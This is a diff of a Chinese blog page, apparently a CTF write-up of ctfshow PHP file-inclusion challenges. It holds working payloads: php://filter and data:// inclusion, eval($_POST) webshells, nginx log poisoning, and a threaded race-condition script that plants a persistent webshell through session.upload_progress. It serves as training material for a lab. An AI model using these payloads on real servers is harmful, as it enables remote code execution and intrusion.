@@ -1,247 +1,197 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 6.1.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/css/main.css">
+  <!-- Minima -->
+  <!-- Hexo theme created by @adisaktijrs -->
 
-<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|EB Garamond:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta charset="utf-8">
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"ja1e.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
+  
+  <title>ctfshow_web入门_文件包含</title>
+  
+  <link rel="canonical" href="https://ja1e.github.io/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+  
+  <meta name="description" content="web78没有过滤，直接包含 payload： ?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource&amp;#x3D;flag.php  使用php伪协议包含flag.php文件并以baes64编码显示。 得到">
+  
+  
+  <meta name="author" content="Ja1e">
+  
+  
+  
+  <meta property="og:site_name" content="Ja1e" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="ctfshow_web入门_文件包含" />
+  
+  <meta property="og:description" content="web78没有过滤，直接包含 payload： ?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource&amp;#x3D;flag.php  使用php伪协议包含flag.php文件并以baes64编码显示。 得到">
+  
+  <meta property="og:url" content="https://ja1e.github.io/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
 
-  <meta name="description" content="php:&#x2F;&#x2F;filter伪协议、data协议、包含日志文件、session.upload_progress利用、条件竞争、死亡绕过">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow_web入门_文件包含">
-<meta property="og:url" content="https://ja1e.github.io/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
-<meta property="og:site_name" content="Ja1e">
-<meta property="og:description" content="php:&#x2F;&#x2F;filter伪协议、data协议、包含日志文件、session.upload_progress利用、条件竞争、死亡绕过">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://ja1e.github.io/images/mp4.png">
-<meta property="article:published_time" content="2022-08-09T12:10:33.000Z">
-<meta property="article:modified_time" content="2022-09-11T14:14:55.562Z">
-<meta property="article:author" content="Ja1e">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://ja1e.github.io/images/mp4.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="ctfshow_web入门_文件包含">
+  
+  <meta name="twitter:description" content="web78没有过滤，直接包含 payload： ?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource&amp;#x3D;flag.php  使用php伪协议包含flag.php文件并以baes64编码显示。 得到">
+  
+  
+  
+  
+  <meta name="twitter:url" content="https://ja1e.github.io/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
 
-<link rel="canonical" href="https://ja1e.github.io/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+  <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
+  <!-- Preload fonts
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
+  <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+<link rel="stylesheet" href="/css/normalize.css">
 
-  <title>ctfshow_web入门_文件包含 | Ja1e</title>
+  
+<link rel="stylesheet" href="/css/skeleton.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+<link rel="stylesheet" href="/css/prism-dark.css">
+
+  
+<link rel="stylesheet" href="/css/prism-line-numbers.css">
+
+  <!-- User css -->
+  
+  
+<link rel="stylesheet" href="/css/user.css">
+
   
 
+  <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="icon" type="image/png" href="/images/favicon.png">
 
-
-
-
-
-  <noscript>
+  <!-- Custom Theme Color Style
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
   <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
+  a:not(.icon) {
+    text-decoration-color: #0FA0CE;
+    background-image: linear-gradient(
+      to bottom,
+      rgba(0, 0, 0, 0) 50%,
+      #0FA0CE 50%
+    );
   }
+  blockquote {
+    border-left: 8px solid #0FA0CE;
+  }
+  .nanobar .bar {
+    background: #0FA0CE;
+  }
+  .button.button-primary:hover,
+  button.button-primary:hover,
+  input[type="submit"].button-primary:hover,
+  input[type="reset"].button-primary:hover,
+  input[type="button"].button-primary:hover,
+  .button.button-primary:focus,
+  button.button-primary:focus,
+  input[type="submit"].button-primary:focus,
+  input[type="reset"].button-primary:focus,
+  input[type="button"].button-primary:focus {
+    background-color: #0FA0CE;
+    border-color: #0FA0CE;
+  }
+  input[type="email"]:focus,
+  input[type="number"]:focus,
+  input[type="search"]:focus,
+  input[type="text"]:focus,
+  input[type="tel"]:focus,
+  input[type="url"]:focus,
+  input[type="password"]:focus,
+  textarea:focus,
+  select:focus {
+    border: 1px solid #0FA0CE;
+  }
+</style>
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+  <!-- Google Analytics (With Privacy Settings On)
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
 
-</head>
+  
+  <script src="/js/pic.min.js" defer></script>
+  
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
+  
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div class="container">
+    <div class="row">
+      <div>
+
+        <div class="row">
+  <div class="two columns" style="max-width: 50px">
+    <h1 class="mt-2 mode">
+      <div onclick=setDarkMode(true) id="darkBtn">🌑</div>
+      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>☀️</div>
+      <script >
+        if (localStorage.getItem('preferredTheme') == 'dark') {
+          setDarkMode(true)
+        }
+        function setDarkMode(isDark) {
+          var darkBtn = document.getElementById('darkBtn')
+          var lightBtn = document.getElementById('lightBtn')
+          if (isDark) {
+            lightBtn.style.display = "block"
+            darkBtn.style.display = "none"
+            localStorage.setItem('preferredTheme', 'dark');
+          } else {
+            lightBtn.style.display = "none"
+            darkBtn.style.display = "block"
+            localStorage.removeItem('preferredTheme');
+          }
+          document.body.classList.toggle("darkmode");
+        }
+      </script>
+    </h1>
   </div>
 
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Ja1e</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">Ja1e的博客</p>
+  <div class="six columns ml-1">
+    <h1 class="mt-2">
+      Hi Folks.
+    </h1>
   </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+  <div class="twelve columns">
+    <div class="row">
+      <div class="nine columns left">
+        <a href="/">Home</a>
+        
+          
+          <a href="/About" class="ml">About</a>
+          
+        
+        
+      </div>
     </div>
+    <hr style="margin-bottom: 2.6rem">
   </div>
 </div>
+<link rel="stylesheet" href="/js/prism/prism.css">
+        <div class="trans">
+            <h2>ctfshow_web入门_文件包含</h2>
 
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ja1e.github.io/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Ja1e">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ja1e">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          ctfshow_web入门_文件包含
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-08-09 20:10:33" itemprop="dateCreated datePublished" datetime="2022-08-09T20:10:33+08:00">2022-08-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-09-11 22:14:55" itemprop="dateModified" datetime="2022-09-11T22:14:55+08:00">2022-09-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-            <div class="post-description">php://filter伪协议、data协议、包含日志文件、session.upload_progress利用、条件竞争、死亡绕过</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><p>没有过滤，直接包含</p>
+  <h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><p>没有过滤，直接包含</p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用php伪协议包含flag.php文件并以baes64编码显示。</p>
 <p>得到：</p>
@@ -251,20 +201,23 @@
 <p>base64解码即可</p>
 <h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><p>过滤字符串php，把php替换成了???</p>
 <p>这里我用的data协议。因为过滤了php，所以又使用了短标签&#x3D;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= @eval($_POST[&#x27;1&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; @eval($_POST[&#39;1&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后post：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1&#x3D;system(&#39;cat flag.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>左击查看网页源代码，就能发现flag</p>
 <p>或者：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#php可以用大小写绕过</span><br><span class="line">?file=data://text/plain,&lt;?pHp system(&#x27;cat flag.php&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain,&lt;?= system(&#x27;cat flag.php&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#php可以用大小写绕过
+?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?pHp system(&#39;cat flag.php&#39;);?&gt;
+?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(&#39;cat flag.php&#39;);?&gt;
+?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><p>本关过滤了php和data应该是不允许使用伪协议，但是可以正常包含，采用包含日志文件的方式。</p>
 <p>环境是nginx的，有一个nginx访问日志<code>/var/log/nginx/access.log</code> ，我们包含它看看。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>它的内容是这样的：</p>
 <blockquote>
@@ -273,7 +226,8 @@
 <p>有ip、时间、参数值、user-agent</p>
 <p>其中user-agent是我们比较好操控的，抓包在user-agent后面写入一句话，直接放包。</p>
 <p>然后包含日志文件，执行后门：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;ls&#x27;);phpinfo();</span><br><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac fl0g.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(&#39;ls&#39;);phpinfo();
+?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(&#39;tac fl0g.php&#39;);phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p> <strong>web81和web80一样</strong></p>
@@ -284,7 +238,10 @@
 <p>过滤了点之后我们只能包含无后缀的文件，而在php中无后缀文件就是session文件。</p>
 </blockquote>
 <p>我们可以利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数，该功能是在php5.4添加的，首先先了解下php.ini以下的几个<strong>默认</strong>选项</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enable = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">session.upload_progress.enable &#x3D; on
+session.upload_progress.cleanup &#x3D; on
+session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;
+session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ul>
 <li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中；</li>
@@ -308,7 +265,50 @@
 <p>通过了解PHP_SESSION_UPLOAD_PROGRESS的cleanup选项，我们知道文件上传结束后，php将会<strong>立即清空</strong>session文件。如果我们手工去包含session文件，时间肯定是来不及的，session文件早就被删了。</p>
 <p><em>所以我们需要利用<strong>条件竞争</strong></em></p>
 <p>脚本(建议自己写写)：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io,threading,requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c51db129-a21f-45a7-aa70-76187d628ea9.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;eve&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;file_put_contents(&quot;/var/www/html/2.php&quot;,&quot;&lt;?php eval(\$_POST[2]);?&gt;&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">500</span>)</span><br><span class="line">        response = session.post(url,data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">        &#125;,</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;test.jpg&#x27;</span>,fileBytes)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">                                cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">        &#125; )</span><br><span class="line">        response2 = session.get(url+<span class="string">&#x27;2.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response2.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;+++++++++++done+++++++++++&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token punctuation">,</span>threading<span class="token punctuation">,</span>requests
+
+url <span class="token operator">=</span> <span class="token string">'http://c51db129-a21f-45a7-aa70-76187d628ea9.challenge.ctf.show/'</span>
+sessionid <span class="token operator">=</span> <span class="token string">'eve'</span>
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'file_put_contents("/var/www/html/2.php","&lt;?php eval(\$_POST[2]);?>");'</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        fileBytes <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">500</span><span class="token punctuation">)</span>
+        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+            <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php eval($_POST[1]);?>"</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">,</span>fileBytes<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token comment"># print(response.text)</span>
+
+<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_'</span><span class="token operator">+</span>sessionid<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>
+                                cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
+        <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span>
+        response2 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'2.php'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> response2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"+++++++++++done+++++++++++"</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>response2<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
